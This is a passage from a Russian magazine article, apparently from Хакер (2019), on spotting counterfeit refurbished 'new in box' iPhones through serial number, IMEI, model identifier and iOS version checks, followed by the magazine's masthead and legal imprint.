БЕЗ TOUCH ID
Несколько лет назад на рынке появились круп ные партии «новых в коробке»
iPhone 5s «без Touch ID». Во всех случаях это будут «подвальные» аппараты,
восстановленные кустарным способом в Китае с использованием неродных
модулей экран + Touch ID. Какие еще детали в каждом таком телефоне
поменяли китайские умельцы — тайна. Тем не менее сам факт наличия таких
телефонов  заставил  «ведущего  ана литика»  Эль дара Муртазина  пред‐
положить, что именно работники Apple сидят в китайских подвалах:



      Учитывая, как в ком пании отсле жива ют все, что происходит вок руг
       iPhone, пред положить, что Apple не видит эти вос ста нов ленные аппа-
      раты, невоз можно. Но ком пания никак не реагирует, более того, она
      не отклю чает эти телефоны, не пре пятс тву ет их активации. Для меня
      это ясно ука зыва ет на то, что в ком пании не прос то зна ют о подобных
      устройствах, но крайне заинтересованы в их появ лении на множес тве
     рынков. <...> Пред положить, что кто‑то, кроме Apple, может соз давать
      новые IMEI-номера для iPhone, невоз можно, а зна чит, эту активность
      проявляет сама ком пания.

На самом же деле под видом «новых» или «refurbished» аппаратов покупателю
предлагаются кадавры, соб ранные умельцами из нес кольких устройств или с
использованием дешевых неоригинальных запчастей. Под робности по ссыл‐
ке: «iPhone без Touch ID — что это и стоит ли покупать?».


КАК ПРОВЕРИТЬ: СЕРИЙНЫЙ НОМЕР
Кое‐что о телефоне можно узнать, даже не распечатывая коробку. Для этого
достаточно ввести серийный номер устройства с коробки на странице check‐
coverage.apple.com.
  ВНИМАНИЕ: в ряде случаев серийный номер, указанный на коробке куп‐
ленного у подозрительного продавца устройства, может не совпадать с тем
номером, который сообщает iOS. Если такое случилось, никакие дальнейшие
проверки не нужны; перед тобой — «подвальный» iPhone.
  При проверке серийного номера нового или офи циально восстанов‐
ленного устройства, которое еще не было активировано, ты должен получить
сообщение об отсутствии у Apple данных о гарантийном обслуживании. Если
же ты видишь сообщение «срок истек» — ждать ничего не нужно: перед тобой
бывшее в употреблении устройство, «восста новленное» в подвале. Если ты
видишь что‐то подоб ное, перед тобой — «подваль ная» подделка:



      Техничес кая под дер жка по телефону: срок истек
     Вам  пре дос тавляется  пра во  на  платное  телефонное  обра щение
      в службу техничес кой под дер жки Apple.


     Пра во на обслу жива ние и ремонт: срок истек
      Согласно нашим данным, на этот продукт больше не рас простра няют-
      ся условия огра ниченной гарантии Apple или программы AppleCare,
      пре дос тавляв ших пра во на обслу жива ние и ремонт аппа ратного обес-
      печения, по причине исте чения срока действия.

У официально восстановленного устройства всегда будет год гарантийного
обслуживания от Apple. Если ты проверишь гарантийные обязательства про‐
изводителя  после  активации  iPhone,  ты  должен  увидеть информацию
об оставшемся сроке гарантийного обслуживания — это дол жен быть один
год, а дата активации должна совпадать с той датой, когда ты действительно
активировал телефон. К сожалению, сайт отра батывает с задержкой (иног‐
да — длительной задержкой, час то до суток), так что актуальной информации
ты можешь и не дождаться.


КАК ПРОВЕРИТЬ: IMEI
Довольно много информа ции о телефо не можно получить, прос то проверив
идентификатор IMEI. Для это го нуж но ввести IMEI устройства на сайте imei.in‐
fo. В результате нам выдадут что‐то подоб ное.





Из полезного:
 • Цвет. Не верь глазам своим: если про верка по IMEI утверждает, что
   телефон  «золотой», а  в  руках  у тебя устройство серого цвета —
   перед тобой кадавр.
 • Дата выпуска (точная) и предположительная дата продажи. По дате
   выпуска можно точно узнать, какая вер сия iOS должна быть установлена
   на телефоне.

Процесс производства iPhone отличается от про цес са производства смар‐
тфонов с Android. Если на телефон с Android производитель может залить,
в принципе, любую версию про шивки от самой первой до актуальной
на момент выхода телефона с конвейера (нам встречались оба вари анта), то
с iPhone все гораздо проще: может быть установлена только и исключительно
та версия iOS, которую Apple продолжает подписывать на момент сборки
устройства. То есть, если устройство выпущено 2 августа 2016 года, на нем
может быть установлена только iOS 9.3.4 и никакая другая. Если вдруг тебе
предлагают устрой ство, выпущенное в далеком 2016 году, а на борту у него
стоит iOS 12 — знай: «новым в коробке» устрой ством дол го и с удовольстви‐
ем пользовались и регулярно обновляли.
  А вот предположитель ная дата про дажи на самом деле может означать что
угодно: только Apple зна ет, когда в точности было акти вировано устрой ство
(если это произошло менее года назад, то информацию можно получить
по серийному номеру, см. выше).


ИДЕНТИФИКАТОР МОДЕЛИ
На нашем примере мы видим модель MLY52LL/A (A1662), предназначенную
для американского рынка; более конкрет но аппарат идентифицируется
как «16GB Gold Verizon». В короб ке же вмес те с телефоном была уложена
вполне европейского вида вилка. Если модель пред назначена для одного
региона, а комплектующие в ней — для другого, перед тобой однозначно
кадавр.
  Для iPhone SE назначение идентифика торов моделей можно посмотреть
по ссылке. Для iPhone 7 — рядом.


«ГОД ГАРАНТИИ»
Я знаю, что все перечис ленное выше никак не остановит читате ля от покупки
халявы. «В конце концов, они же дают год гарантии», — скажет читатель. Мне
же вспоминается история одного знакомого, который купил в подземном
переходе часы Rolex за пару сотен рублей и пошел с ними купаться, понаде‐
явшись на надпись water resistance. Нужно ли говорить, что «water resistance»
там был точно такой же, как и «Rolex»?
  Мы уже выяснили, что гарантии от Apple у покупателей «подвальных»
iPhone не будет. Если у тебя воз никала мысль, что ты сможешь зай ти в Apple
Store во время туристической поез дки и тебе заменят дефектное устройство
на новое, — забудь. Оригинальная гарантия давно истекла, и единственное,
на что ты можешь рассчитывать, — это доб рая воля продавца.
  Интересный момент: на гарантийном талоне (от магазина) всегда ука‐
зывается серийный номер с коробки. Как ты думаешь, согласится ли магазин
взять в ремонт устрой ство с дру гим серийным номером, не совпадающим
с тем, который пропечатан в талоне?


ЧТО ВНУТРИ И ОТКУДА ОНО БЕРЕТСЯ?
А если такой телефон разоб рать, что будет внутри? Из любопытства мы
разобрали два устрой ства с ярко выраженными дефектами. В обоих слу чаях
мы увидели неопрятный, явно неродной аккумулятор и шлей фы. Похоже,
от оригинального в том устройстве была исключительно материнская плата.
  Показателен в этом смыс ле пример Скотти Аллена, который поехал
в Китай и собрал пол ностью работоспособный iPhone 6s из запчастей, куп‐
ленных на местных радиорынках. По сло вам Скотти, самым сложным ока‐
залась материнская плата: как бы ему ни хотелось собрать ее самостоятель‐
но, обойти процедуру подключения и настройки Touch ID ему не удалось.
Пришлось приобрести материнскую плату в сбо ре с датчиком отпечатков,
которую китайцы вытащили из сло манного iPhone. Историей закупки ком‐
понентов и сбор ки устройства мож но нас ладить ся в 23‐минутном ролике,
снятом самим автором.


ВЫВОДЫ
Стоит ли покупать «новый в коробке» iPhone с «годом гарантии» и чем
это может грозить в будущем?
  Покупка «нового» iPhone за полцены — это лотерея без единого выиг‐
рышного номера. В лучшем случае ты получишь б/у устрой ство с истекшей
гарантией, в худшем — своеобразного монстра Франкенштейна с деталя ми
неизвестного происхождения. Неоригинальные экра ны в таких устройствах,
как правило, очень хрупкие (один такой экран треснул напополам буквально
у нас в руках); олеофоб ного покрытия может не быть совсем, а если оно
есть — то сотрется в ближайшие недели. Цветопе редача таких экранов
может сильно отличаться от задуманной Apple.
  О том, чем может грозить установка неори гинального датчика Touch ID,
наверное, знают все: неродной датчик просто «отвалится» после оче редного
обновления iOS. Кстати, сюда же относятся все телефоны iPhone 5s/6/6s
и далее по списку, которые продаются «без Touch ID».
   Стоит ли покупать такое для личного пользования? Нет, даже ребенку
(из‐за хрупкости экрана). А вот если твоя цель — исследование безопасности
iOS, то партия таких устройств может помочь ощу тимо сэкономить.
   №02 (239)
          Андрей Письменный        Илья Русанен          Алек сей Глазков
              Глав ный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                 Евгения Шарипо ва
                                     Литературный редактор


                           РЕ ДАК ТОРЫ РУБРИК
          Андрей Письменный        Илья Русанен          Александр «Dr.»
               pismenny@glc.ru             rusanen@glc.ru            Лозовский
                                                                           lozovsky@glc.ru
          Иван «aLLy» Андреев       Ев гений Зобнин          Татьяна Чуп рова
            iam@russiansecurity.expert          zobnin@glc.ru              chuprova@glc.ru
                      Андрей Васильков     Валентин Холмогоров
                        the.angstroem@gmail.com      valentin@holmogorov.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                               РЕК ЛАМА

                                  Анна Яков лева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по подписке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Друж бы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколам ское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязательно сов пада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редак ция
не несет ответственности за содер жание рекламных объ явлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2019